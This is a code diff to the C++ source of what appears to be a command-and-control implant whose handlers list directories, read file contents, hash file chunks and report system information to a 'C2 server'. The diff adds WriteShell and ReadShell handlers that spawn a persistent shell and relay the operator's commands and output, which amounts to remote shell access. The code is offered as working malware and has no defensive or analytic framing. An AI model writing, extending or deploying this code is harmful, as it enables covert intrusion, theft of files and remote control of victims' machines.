@@ -9,6 +9,7 @@
 #include "sha2.h"
 #include "vector.h"
 #include "system_info.h"
+#include "string.h"
 
 // =============================================================================
 // Wire-format directory entry — fixed layout matching the C2 server protocol.
@@ -19,7 +20,7 @@
 #pragma pack(push, 1)
 struct WireDirectoryEntry
 {
-    CHAR16 Name[256];        ///< UTF-16LE file/directory name
+    CHAR16 Name[256]; ///< UTF-16LE file/directory name
     UINT64 CreationTime;
     UINT64 LastModifiedTime;
     UINT64 Size;
@@ -82,7 +83,7 @@ static BOOL IsDotEntry(const DirectoryEntry &entry)
            StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".."_embed);
 }
 
-VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
+VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
     WCHAR directoryPath[1024];
     DecodeWirePath(command, directoryPath, 1024);
@@ -135,7 +136,7 @@ VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_u
     }
 }
 
-VOID Handle_GetFileContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
+VOID Handle_GetFileContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
     UINT64 readCount = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
@@ -165,7 +166,7 @@ VOID Handle_GetFileContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused
     *(PUINT64)(*response + sizeof(UINT32)) = bytesRead;
 }
 
-VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
+VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
     UINT64 chunkSize = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
@@ -214,7 +215,7 @@ VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unus
     LOG_INFO("File chunk hash computed successfully for %llu bytes read", totalRead);
 }
 
-VOID Handle_GetSystemInfoCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
+VOID Handle_GetSystemInfoCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
     LOG_INFO("Getting system info");
 
@@ -227,4 +228,72 @@ VOID Handle_GetSystemInfoCommand([[maybe_unused]] PCHAR command, [[maybe_unused]
     Memory::Copy(*response + sizeof(UINT32), &info, sizeof(SystemInfo));
 
     LOG_INFO("System info: hostname=%s, arch=%s, platform=%s", info.Hostname, info.Architecture, info.Platform);
+}
+
+VOID Handle_WriteShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
+{
+    LOG_INFO("Handling WriteShell command");
+
+    if (context->shell == nullptr)
+    {
+        auto shellResult = Shell::Create();
+
+        if (!shellResult)
+        {
+            LOG_ERROR("Failed to create shell");
+            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+            return;
+        }
+        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
+    }
+
+    auto writeResult = context->shell->Write(command, commandLength);
+    if (!writeResult)
+    {
+        LOG_ERROR("Failed to write to shell");
+        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        return;
+    }
+
+    *response = new CHAR[*responseLength];
+    *(PUINT32)*response = StatusCode::StatusSuccess;
+
+    LOG_INFO("WriteShell command handled successfully");
+}
+
+VOID Handle_ReadShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
+{
+    LOG_INFO("Handling ReadShell command");
+
+    if (context->shell == nullptr)
+    {
+        auto shellResult = Shell::Create();
+        if (!shellResult)
+        {
+            LOG_ERROR("Failed to create shell");
+            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+            return;
+        }
+        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
+    }
+
+    CHAR buffer[4096];
+
+    auto readResult = context->shell->Read(buffer, sizeof(buffer));
+    if (!readResult)
+    {
+        LOG_ERROR("Failed to read from shell");
+        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        return;
+    }
+
+    // for null termination
+    auto readResultLenght = readResult.Value() + 1;
+
+    *responseLength += readResultLenght;
+    *response = new CHAR[*responseLength];
+    *(PUINT32)*response = StatusCode::StatusSuccess;
+    StringUtils::Copy(Span<CHAR>(*response + sizeof(UINT32), readResultLenght), Span<const CHAR>(buffer, readResultLenght));
+
+    LOG_INFO("ReadShell command handled successfully");
 }
